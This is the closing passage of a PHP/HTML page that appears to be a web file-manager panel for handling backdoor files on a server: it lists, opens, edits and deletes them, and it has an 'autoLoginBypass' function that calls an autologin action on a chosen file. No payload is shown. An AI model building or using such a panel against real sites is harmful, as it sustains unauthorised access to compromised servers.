                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
        </div>
        <?php endif; ?>
    </div>
</div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
let currentUrl = <?= json_encode(!empty($view) ? showFileUrl($view) : '') ?>;
let currentFilePath = <?= json_encode($view ?? '') ?>;

function openPreview() {
    if (currentUrl) window.open(currentUrl, '_blank');
}

function copyUrl() {
    if (!currentUrl) return;
    navigator.clipboard.writeText(currentUrl).then(() => alert('✅ URL copied!'));
}

function autoLoginBypass() {
    if (!currentFilePath) return alert('No file selected');
    window.location.href = '?action=autologin&target=' + encodeURIComponent(currentFilePath);
}

function toggleEdit() {
    const textarea = document.getElementById('edit-content');
    const btn = document.getElementById('toggle-btn');
    if (!textarea || !btn) return;

    textarea.readOnly = !textarea.readOnly;
    textarea.classList.toggle('textarea-editable', !textarea.readOnly);
    btn.innerText = textarea.readOnly ? '✏️ Edit' : '✅ Readonly';
}

function copyAll() {
    const textarea = document.getElementById('edit-content');
    if (!textarea) return;
    navigator.clipboard.writeText(textarea.value).then(() => alert('✅ File content copied!'));
}

document.getElementById('save-form')?.addEventListener('submit', function () {
    const editor = document.getElementById('edit-content');
    const hidden = document.getElementById('hidden-content');
    if (editor && hidden) hidden.value = editor.value;
});

function openSelectedTabs() {
    const checked = document.querySelectorAll('.backdoor-open-checkbox:checked');
    if (!checked.length) return;

    checked.forEach(cb => {
        const url = cb.dataset.url;
        if (url) window.open(url, '_blank', 'noopener');
    });
}
</script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const btn = document.getElementById('select-page-btn');
    if (!btn) return;

    btn.addEventListener('click', function () {
        document.querySelectorAll('#backdoor-open-form .backdoor-open-checkbox').forEach(cb => {
            cb.checked = true;
        });
    });
});
</script>
<script>
let selectedBackdoorFiles = [];

function updateSelectedList() {
    const list = document.getElementById('selected-list');
    const count = document.getElementById('selected-count');
    if (!list || !count) return;

    list.innerHTML = '';
    selectedBackdoorFiles.forEach(item => {
        const li = document.createElement('li');
        li.className = 'list-group-item list-group-item-warning';
        li.innerHTML = `<div class="small"><strong>${escapeHtml(item.file)}</strong></div>`;
        list.appendChild(li);
    });

    count.textContent = selectedBackdoorFiles.length;
}

function clearSelectedList() {
    selectedBackdoorFiles = [];
    updateSelectedList();
}

function deleteSelectedFiles() {
    if (!selectedBackdoorFiles.length) {
        alert('List masih kosong');
        return;
    }

    if (!confirm('Yakin mau hapus file backdoor yang dipilih?')) return;

    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
            delete_selected_backdoor: '1',
            files: JSON.stringify(selectedBackdoorFiles.map(x => x.file))
        })
    }).then(() => {
        selectedBackdoorFiles = [];
        updateSelectedList();
        location.reload();
    });
}

document.getElementById('move-to-list-btn')?.addEventListener('click', function () {
    const checked = document.querySelectorAll('.backdoor-open-checkbox:checked');
    if (!checked.length) {
        alert('Belum ada file yang dicentang');
        return;
    }

    checked.forEach(cb => {
        const file = cb.dataset.file;
        const url = cb.dataset.url;
        if (file && !selectedBackdoorFiles.some(x => x.file === file)) {
            selectedBackdoorFiles.push({ file, url });
        }
    });

    updateSelectedList();
});

function escapeHtml(text) {
    return text
        .replaceAll('&', '&amp;')
        .replaceAll('<', '&lt;')
        .replaceAll('>', '&gt;')
        .replaceAll('"', '&quot;')
        .replaceAll("'", '&#039;');
}
</script>
<script>
function setEditorPreview(url, content) {
    const textarea = document.getElementById('edit-content');
    const iframe = document.getElementById('preview-frame');
    if (textarea && typeof content === 'string') textarea.value = content;
    if (iframe && url) iframe.src = url;
}
</script>
</body>
</html>
